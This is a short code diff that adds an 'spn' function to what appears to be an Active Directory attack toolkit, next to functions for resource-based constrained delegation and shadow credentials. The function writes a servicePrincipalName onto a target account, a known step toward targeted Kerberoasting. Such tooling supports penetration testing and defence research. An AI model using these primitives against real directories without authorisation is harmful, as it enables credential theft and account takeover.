@@ -284,6 +284,21 @@ def rbcd(conn, target: str, service: str):
 
     LOG.info(f"[+] {service} can now impersonate users on {target} via S4U2Proxy")
 
+def spn(conn, target: str, service: str):
+    """
+    Add an SPN to a target account (Requires "Write" permission on target's servicePrincipalName)
+
+    :param target: sAMAccountName, DN, GUID or SID of the target
+    :param service: servicePrincipalName to add (for example: http/host.domain.local or cifs/host.domain.local)
+    """
+    target_dn = conn.ldap.dnResolver(target)
+    conn.ldap.bloodymodify(
+        target_dn,
+        {"servicePrincipalName": [(Change.ADD.value, str(service))]},
+    )
+
+    LOG.info(f"[+] servicePrincipalName attribute of {target} updated")
+
 
 def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     """
